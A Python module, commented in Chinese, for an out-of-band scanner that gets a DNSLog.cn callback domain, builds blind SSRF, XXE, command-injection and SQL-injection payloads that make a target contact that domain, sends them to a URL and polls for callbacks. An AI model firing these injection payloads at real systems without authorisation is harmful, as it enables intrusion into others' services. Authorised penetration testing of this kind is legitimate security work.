"""
security/oob_detector.py - 带外检测(OOB)与利用代码生成器

核心能力：
- DNS回调检测（验证盲SSRF、盲XXE、盲命令注入）
- HTTP回调检测（验证盲漏洞）
- 利用代码生成器（根据漏洞类型生成PoC/Exploit）
- 支持SQL注入、XSS、命令注入、SSRF、目录遍历、文件上传等漏洞类型
"""
import os
import re
import sys
import json
import time
import uuid
import socket
import threading
import urllib.parse
import urllib.request
from typing import Any, Dict, List, Optional, Tuple
from dataclasses import dataclass, field
from enum import Enum
from collections import defaultdict


# ================================================================
# 数据结构
# ================================================================

class OOBChannelType(Enum):
    """OOB通道类型"""
    DNS = "dns"
    HTTP = "http"
    DNS_HTTP = "dns_http"

@dataclass
class OOBInteraction:
    """OOB交互记录"""
    interaction_id: str = ""
    channel: str = ""
    protocol: str = ""
    remote_ip: str = ""
    remote_port: int = 0
    query: str = ""
    raw_request: str = ""
    timestamp: float = 0.0

    def __post_init__(self):
        if not self.interaction_id:
            self.interaction_id = f"oob_{uuid.uuid4().hex[:12]}"
        if not self.timestamp:
            self.timestamp = time.time()

    def to_dict(self) -> Dict:
        return {
            "interaction_id": self.interaction_id,
            "channel": self.channel,
            "protocol": self.protocol,
            "remote_ip": self.remote_ip,
            "remote_port": self.remote_port,
            "query": self.query,
            "timestamp": self.timestamp,
        }

@dataclass
class OOBResult:
    """OOB检测结果"""
    result_id: str = ""
    vuln_type: str = ""
    target: str = ""
    payload: str = ""
    callback_domain: str = ""
    callback_id: str = ""
    interactions: List[OOBInteraction] = field(default_factory=list)
    vulnerable: bool = False
    confidence: str = "low"
    evidence: str = ""
    started_at: float = 0.0
    completed_at: float = 0.0

    def __post_init__(self):
        if not self.result_id:
            self.result_id = f"oob_result_{uuid.uuid4().hex[:12]}"
        if not self.started_at:
            self.started_at = time.time()

    def to_dict(self) -> Dict:
        return {
            "result_id": self.result_id,
            "vuln_type": self.vuln_type,
            "target": self.target,
            "payload": self.payload,
            "callback_domain": self.callback_domain,
            "vulnerable": self.vulnerable,
            "confidence": self.confidence,
            "evidence": self.evidence,
            "interaction_count": len(self.interactions),
            "interactions": [i.to_dict() for i in self.interactions],
        }

@dataclass
class Exploit:
    """利用代码"""
    exploit_id: str = ""
    vuln_type: str = ""
    target: str = ""
    language: str = "python"
    exploit_type: str = "poc"  # poc/exploit/payload
    code: str = ""
    description: str = ""
    requirements: List[str] = field(default_factory=list)
    usage: str = ""
    severity: str = "medium"
    generated_at: float = 0.0

    def __post_init__(self):
        if not self.exploit_id:
            self.exploit_id = f"exploit_{uuid.uuid4().hex[:12]}"
        if not self.generated_at:
            self.generated_at = time.time()

    def to_dict(self) -> Dict:
        return {
            "exploit_id": self.exploit_id,
            "vuln_type": self.vuln_type,
            "target": self.target,
            "language": self.language,
            "exploit_type": self.exploit_type,
            "code": self.code,
            "description": self.description,
            "requirements": self.requirements,
            "usage": self.usage,
            "severity": self.severity,
        }

    def save(self, output_dir: str = "exploits") -> str:
        """保存利用代码到文件"""
        os.makedirs(output_dir, exist_ok=True)
        ext_map = {"python": "py", "bash": "sh", "javascript": "js", "php": "php", "text": "txt"}
        ext = ext_map.get(self.language, "txt")
        filename = f"{self.vuln_type}_{self.exploit_id[-8:]}.{ext}"
        filepath = os.path.join(output_dir, filename)
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(self.code)
        return filepath

class OOBDetector:
    """带外检测器 - 通过DNS/HTTP回调验证盲漏洞

    支持的OOB服务：
    - interactsh-client（本地）
    - Burp Collaborator（需配置）
    - DNSLog.cn（在线）
    - 自定义回调服务器
    """

    def __init__(self, oob_server: str = "dnslog.cn", api_key: str = "",
                 poll_interval: float = 2.0, max_poll_time: int = 30):
        self.oob_server = oob_server
        self.api_key = api_key
        self.poll_interval = poll_interval
        self.max_poll_time = max_poll_time
        self.callback_domain = ""
        self.callback_id = ""
        self.interactions: List[OOBInteraction] = []
        self._session = None
        self._init_callback()

    def _init_callback(self):
        """初始化回调域名"""
        if self.oob_server == "dnslog.cn":
            try:
                url = "http://www.dnslog.cn/getdomain.php"
                req = urllib.request.Request(url)
                req.add_header("User-Agent", "Mozilla/5.0")
                resp = urllib.request.urlopen(req, timeout=10)
                domain = resp.read().decode("utf-8").strip()
                if domain:
                    self.callback_domain = domain
                    self.callback_id = domain.split(".")[0]
            except Exception:
                self.callback_domain = f"{uuid.uuid4().hex[:8]}.oob.local"
                self.callback_id = uuid.uuid4().hex[:8]
        else:
            self.callback_domain = f"{uuid.uuid4().hex[:8]}.{self.oob_server}"
            self.callback_id = uuid.uuid4().hex[:8]

    def get_callback_domain(self, subdomain: str = "") -> str:
        """获取回调域名"""
        if subdomain:
            return f"{subdomain}.{self.callback_domain}"
        return self.callback_domain

    def generate_oob_payload(self, vuln_type: str, target_param: str = "") -> Dict:
        """生成带OOB回调的payload"""
        domain = self.get_callback_domain(vuln_type)
        payloads = {
            "ssrf": [
                f"http://{domain}/",
                f"http://{domain}/ssrf-test",
                f"http://{domain}/?url={target_param}",
            ],
            "xxe": [
                f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{domain}/xxe">]><foo>&xxe;</foo>',
                f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "dns://{domain}">]><foo>&xxe;</foo>',
            ],
            "command_injection": [
                f"; nslookup {domain}",
                f"; ping -c 2 {domain}",
                f"; curl http://{domain}/cmd",
                f"| nslookup {domain}",
                f"`nslookup {domain}`",
                f"$(nslookup {domain})",
            ],
            "sql_injection": [
                f"' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\{domain}\\\\test')))--",
                f"' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\{domain}\\\\test'))--",
                f"; SELECT pg_sleep(1); SELECT lo_import('http://{domain}/test')--",
            ],
            "directory_traversal": [
                f"../../../../proc/self/environ?{domain}",
            ],
        }
        return {
            "callback_domain": domain,
            "payloads": payloads.get(vuln_type, []),
            "vuln_type": vuln_type,
        }

    def poll_interactions(self) -> List[OOBInteraction]:
        """轮询回调交互"""
        new_interactions = []
        if self.oob_server == "dnslog.cn":
            try:
                url = f"http://www.dnslog.cn/getrecords.php?t={int(time.time())}"
                req = urllib.request.Request(url)
                req.add_header("User-Agent", "Mozilla/5.0")
                req.add_header("Referer", "http://www.dnslog.cn/")
                resp = urllib.request.urlopen(req, timeout=10)
                data = json.loads(resp.read().decode("utf-8"))
                if isinstance(data, list):
                    for record in data:
                        if isinstance(record, list) and len(record) >= 3:
                            interaction = OOBInteraction(
                                channel="dns",
                                protocol="DNS",
                                remote_ip=record[2] if len(record) > 2 else "",
                                query=record[0] if len(record) > 0 else "",
                            )
                            new_interactions.append(interaction)
                            self.interactions.append(interaction)
            except Exception:
                pass
        return new_interactions

    def detect(self, target: str, vuln_type: str, payload: str,
               injection_point: str = "url_param", parameter: str = "") -> OOBResult:
        """执行OOB检测"""
        result = OOBResult(
            vuln_type=vuln_type,
            target=target,
            payload=payload,
            callback_domain=self.callback_domain,
            callback_id=self.callback_id,
        )

        # 发送payload
        try:
            url = target
            if injection_point == "url_param" and parameter:
                separator = "&" if "?" in url else "?"
                url = f"{url}{separator}{urllib.parse.quote(parameter)}={urllib.parse.quote(payload)}"

            req = urllib.request.Request(url, method="GET")
            req.add_header("User-Agent", "Mozilla/5.0")
            urllib.request.urlopen(req, timeout=10)
        except Exception:
            pass

        # 轮询回调
        start_time = time.time()
        while time.time() - start_time < self.max_poll_time:
            interactions = self.poll_interactions()
            if interactions:
                result.interactions.extend(interactions)
                result.vulnerable = True
                result.confidence = "high"
                result.evidence = f"收到{len(interactions)}个OOB回调: {interactions[0].query}"
                break
            time.sleep(self.poll_interval)

        result.completed_at = time.time()
        return result

    def get_stats(self) -> Dict:
        return {
            "callback_domain": self.callback_domain,
            "callback_id": self.callback_id,
            "total_interactions": len(self.interactions),
            "oob_server": self.oob_server,
        }
